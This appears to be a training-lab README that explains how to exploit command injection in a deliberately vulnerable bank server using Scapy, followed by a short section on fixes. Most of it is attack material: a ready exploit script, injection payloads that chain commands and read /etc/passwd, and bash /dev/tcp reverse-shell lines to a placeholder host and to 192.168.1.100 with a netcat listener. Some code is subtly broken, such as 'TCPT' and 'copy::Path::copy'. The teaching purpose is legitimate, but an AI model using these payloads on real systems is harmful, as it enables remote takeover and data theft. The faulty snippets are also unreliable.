# Scapy COBOL Bank Lab - Exploitation Guide

This lab demonstrates command injection vulnerabilities using Scapy to craft malicious packets.

## Setup

1. Start the server:
   ```bash
   just start-server
   ```

2. In another terminal, setup demo files:
   ```bash
   just setup
   ```

3. Optionally start the normal client to see traffic:
   ```bash
   just start-client
   ```

## The Vulnerability

The server processes these command formats:
```
BANKDATA|XFER|{TO}|{FROM}|{AMOUNT}|X          # Safe - just logs
BANKCMD|CPY|X|X|{SOURCE}|{DESTINATION}        # VULNERABLE - shell injection!
BANKCMD|RUN|X|X|{COMMAND}|                    # VULNERABLE - direct execution!
```

### CPY Command Vulnerability

The server executes:
```bash
cp {SOURCE} {DESTINATION}
```

This means any shell metacharacters in `{SOURCE}` or `{DESTINATION}` will be executed!

### RUN Command Vulnerability

The server executes:
```bash
sh -c {COMMAND}
```

Direct command execution - anything goes!

## Exploiting with Scapy

### Basic Scapy Template

```python
from scapy.all import *

# Craft a raw TCP packet with your malicious payload
ip = IP(dst="127.0.0.1")
tcp = TCPT(dport=9999, flags="PA", seq=1000)

# The command you want to inject
payload = b"BANKCMD|RUN|X|X|whoami; echo 'pwned'|\n"

# Send it
send(ip/tcp/payload)
```

### Command Injection Examples

#### 1. Command Chaining (semicolon)
```
BANKCMD|RUN|X|X|whoami; id; hostname|
```

#### 2. Pipe Injection
```
BANKCMD|CPY|X|X|/tmp/file.txt|/tmp/dest.txt; whoami|
```

#### 3. Reverse Shell (classic)
```
BANKCMD|RUN|X|X|bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'|
```

#### 4. Background Execution
```
BANKCMD|RUN|X|X|sleep 30 & whoami|
```

#### 5. Command Substitution
```
BANKCMD|RUN|X|X|echo $(cat /etc/passwd)|
```

### Full Python Exploit Script

```python
#!/usr/bin/env python3
"""
Scapy exploit for the COBOL Bank Lab
"""

from scapy.all import *

TARGET = "127.0.0.1"
TARGET_PORT = 9999

def inject_command(command):
    """Send a malicious command to the bank server."""
    # Format as BANKCMD RUN for direct execution
    payload = f"BANKCMD|RUN|X|X|{command}|\n"

    packet = IP(dst=TARGET) / TCP(dport=TARGET_PORT, flags="PA") / payload.encode()
    send(packet, verbose=0)
    print(f"[+] Sent: {payload.strip()}")

# Example exploits
if __name__ == "__main__":
    # Simple command execution
    inject_command("whoami")

    # Chain commands
    inject_command("id; uname -a")

    # Read files
    inject_command("cat /etc/hostname")

    # For reverse shell, use YOUR IP:
    # inject_command("bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'")
```

## Using Netcat to Catch Reverse Shells

```bash
# Listen on port 4444
nc -lvnp 4444

# Then send reverse shell command via Scapy
```

## Defense

How to fix these vulnerabilities:

1. **Use proper APIs** instead of shell commands:
   ```rust
   // Instead of: Command::new("sh").arg("-c").arg(user_input)
   use std::fs::copy;
   copy::Path::copy(source, dest)?;
   ```

2. **Validate and sanitize** all user input

3. **Use whitelisting** for allowed commands/files

4. **Principle of least privilege** - run with minimal permissions

## Safety

This lab is designed to be safe:
- All commands execute in `/tmp/` only
- Demo scripts are harmless
- Server binds to localhost only
- Perfect for learning security concepts safely!
